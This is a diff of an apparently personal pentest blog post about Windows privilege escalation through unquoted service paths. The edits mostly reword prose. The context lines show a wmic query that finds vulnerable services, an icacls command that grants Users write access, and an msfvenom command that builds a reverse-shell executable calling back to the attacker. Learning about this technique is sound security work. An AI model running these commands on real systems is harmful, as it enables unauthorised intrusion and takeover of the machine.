@@ -8,7 +8,7 @@ tags: [windows privesc, unquoted service path]     # TAG names should always be 
 show_image_post: false                                    # Change this to true
 #image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
 ---
-Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around _unquoted service paths_. We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them. Please note that this section of the module will not be reproducible on your dedicated client.
+Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around _unquoted service paths_. We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them.
 
 Each Windows service maps to an executable file that will be run when the service is started. Most of the time, services that accompany third party software are stored under the C:\\Program Files directory, which contains a space character in its name. This can potentially be turned into an opportunity for a privilege escalation attack.
 
@@ -33,7 +33,7 @@ Although this vulnerability requires a specific combination of requirements, it 
 
 ### Exploitation
 
-First find programs without quotes and with spaces using wmic:
+First find programs _unquoted_ and with spaces using wmic:
 ```powershell
 wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
 ```
@@ -62,7 +62,7 @@ If by any chance there is no Write (W) permission you can still be able to add s
 icacls "C:\Program Files\Vk9 Security/binary files" /GRANT "BUILTIN\Users":W
 ```
 
-Upload a reverse shell created with msfvenom:
+Upload a reverse shell created with msfvenom and upload it to the victim machine _unquoted_ path:
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=445 -f exe -o zen.exe
 ```
